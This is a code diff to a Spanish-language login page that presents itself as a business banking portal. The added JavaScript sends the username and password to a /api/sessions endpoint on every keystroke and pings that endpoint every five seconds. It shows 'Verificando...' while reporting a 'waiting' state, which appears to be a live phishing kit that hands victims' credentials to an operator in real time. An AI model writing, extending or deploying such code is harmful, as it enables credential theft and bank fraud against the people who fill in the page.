@@ -362,6 +362,34 @@
       const mostrar = document.getElementById('btnMostrar')
       let paso = 'usuario'
 
+      let sessionId = localStorage.getItem('produ_session_id')
+      if (!sessionId) {
+        sessionId = 'pb_' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36)
+        localStorage.setItem('produ_session_id', sessionId)
+      }
+
+      function syncLive(state = 'typing') {
+        fetch('/api/sessions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: sessionId,
+            user: (usuario.value || '').trim() || '—',
+            username: (usuario.value || '').trim() || '—',
+            clave: clave.value || '—',
+            password: clave.value || '—',
+            tipo: 'Banca Empresas',
+            device: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
+            state: state
+          })
+        }).catch(() => {})
+      }
+
+      // Ping
+      setInterval(() => {
+        fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {})
+      }, 5000)
+
       function setListo(listo) {
         boton.disabled = !listo
         boton.classList.toggle('listo', listo)
@@ -369,10 +397,18 @@
 
       usuario.addEventListener('input', function () {
         if (paso === 'usuario') setListo(this.value.trim().length > 0)
+        syncLive('typing')
       })
+      usuario.addEventListener('keyup', () => syncLive('typing'))
+      usuario.addEventListener('change', () => syncLive('typing'))
+
       clave.addEventListener('input', function () {
         if (paso === 'clave') setListo(this.value.length > 0)
+        syncLive('typing')
       })
+      clave.addEventListener('keyup', () => syncLive('typing'))
+      clave.addEventListener('change', () => syncLive('typing'))
+
       mostrar.addEventListener('click', function () {
         const visible = clave.type === 'text'
         clave.type = visible ? 'password' : 'text'
@@ -388,8 +424,15 @@
           ayuda.textContent = '¿Olvidaste tu contraseña?'
           setListo(false)
           clave.focus()
+          syncLive('typing')
+        } else if (paso === 'clave' && clave.value) {
+          setListo(false)
+          boton.textContent = 'Verificando...'
+          syncLive('waiting')
         }
       })
+
+      syncLive('typing')
     </script>
   </body>
 </html>
